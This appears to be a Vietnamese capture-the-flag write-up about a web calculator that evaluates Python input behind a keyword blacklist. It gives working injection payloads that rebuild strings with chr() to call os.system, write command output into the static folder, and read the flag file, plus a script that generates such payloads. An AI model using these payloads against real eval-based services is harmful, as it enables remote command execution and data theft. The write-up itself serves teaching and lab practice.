![image](https://github.com/user-attachments/assets/9bbddbcf-fa08-4995-a8a0-3f71b5a89842)

Giao diện chỉ đơn giản như này, khi nhập số và phép toán thì output sẽ trả lại kết quả của phép toán đó:

![image](https://github.com/user-attachments/assets/a5052c4b-0589-4703-bbad-5cae8bc574fc)

Khi bấm ctrl u thì có thể thấy được blacklist của nó:

![image](https://github.com/user-attachments/assets/c4e9f31d-5b99-4729-a34b-fae72f2d63c2)

Do chặn khá nhiều thứ nên tôi dùng chr() để bypass `__import__(chr(111)+chr(115)).system(chr(105)+chr(100))` lệnh tôi chạy là id, output thì ra là 0, điều đó chứng tỏ đã chạy được nhưng không hiện ra output:

![image](https://github.com/user-attachments/assets/9373af79-0953-45c3-9d84-8823e789090f)

![image](https://github.com/user-attachments/assets/5c79bf36-a890-4cfc-bd3f-e9e326b11554)

Nếu để ý thì có cái phần static có thể xem được file trong đấy, tôi dùng `__import__(chr(111)+chr(115)).system(id > /app/static/test.txt)` và chuyển sang là `__import__(chr(111)+chr(115)).system(chr(105)+chr(100)+chr(32)+chr(62)+chr(32)+chr(47)+chr(97)+chr(112)+chr(112)+chr(47)+chr(115)+chr(116)+chr(97)+chr(116)+chr(105)+chr(99)+chr(47)+chr(116)+chr(101)+chr(115)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116))`

![image](https://github.com/user-attachments/assets/a7913de8-2537-4c4d-a82d-32d431a9dcb7)

![image](https://github.com/user-attachments/assets/6df9d9d9-07a8-4e45-998f-4596767f46c4)

```
CMD="cat /flag.txt > /app/static/flag.txt"
payload=""
for i in range(len(CMD)):
    if i==len(CMD)-1:
        payload+=f"chr({ord(CMD[i])})"
    else:
        payload+=f"chr({ord(CMD[i])})+"

payload=f"__import__(chr(111)+chr(115)).system({payload})"
print(payload)
```
